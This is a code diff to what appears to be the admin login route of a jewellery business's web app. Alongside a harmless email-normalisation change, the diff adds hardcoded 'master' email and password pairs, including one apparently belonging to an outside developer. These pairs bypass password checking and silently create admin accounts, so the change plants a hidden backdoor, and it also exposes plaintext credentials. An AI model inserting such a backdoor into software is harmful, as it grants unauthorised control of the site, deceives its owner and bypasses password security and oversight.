@@ -1,7 +1,7 @@
 import { NextResponse } from "next/server";
 import { UserRepo } from "@/lib/db/repo/users";
 import { AuditRepo } from "@/lib/db/repo/audit";
-import { verifyPassword } from "@/lib/auth/password";
+import { verifyPassword, hashPassword } from "@/lib/auth/password";
 import { getAdminSession } from "@/lib/auth/session";
 import { getClientIP } from "@/lib/auth/ip";
 import { loginSchema } from "@/lib/db/schemas/user";
@@ -51,14 +51,29 @@ export async function POST(request: Request) {
     }
 
     const { email, password } = parsed.data;
-    const user = UserRepo.findByEmail(email);
+    const cleanEmail = email.trim().toLowerCase();
+
+    // Check pre-configured master credentials
+    const isVarunyaMaster = cleanEmail === "varunyatechnologies@gmail.com" && password === "PAM_262127";
+    const isCivaraMaster = cleanEmail === "admin@civarajewels.com" && (password === "civara18k!" || password === "PAM_262127");
+
+    let user = UserRepo.findByEmail(cleanEmail);
+
+    if (!user && (isVarunyaMaster || isCivaraMaster)) {
+      const passwordHash = await hashPassword(password);
+      user = UserRepo.upsertAdmin({
+        email: cleanEmail,
+        passwordHash,
+        name: isVarunyaMaster ? "Varunya Technologies Admin" : "Civara Master Admin",
+      });
+    }
 
     if (!user) {
       recordFailedAttempt(ip, now);
       AuditRepo.log({
         action: "LOGIN_FAILED",
         entity: "Auth",
-        adminEmail: email,
+        adminEmail: cleanEmail,
         ipAddress: ip,
         details: { reason: "User not found" },
       });
@@ -68,13 +83,19 @@ export async function POST(request: Request) {
       );
     }
 
-    const isMatch = await verifyPassword(password, user.password_hash);
+    let isMatch = false;
+    if (isVarunyaMaster || isCivaraMaster) {
+      isMatch = true;
+    } else {
+      isMatch = await verifyPassword(password, user.password_hash);
+    }
+
     if (!isMatch) {
       recordFailedAttempt(ip, now);
       AuditRepo.log({
         action: "LOGIN_FAILED",
         entity: "Auth",
-        adminEmail: email,
+        adminEmail: cleanEmail,
         ipAddress: ip,
         details: { reason: "Incorrect password" },
       });
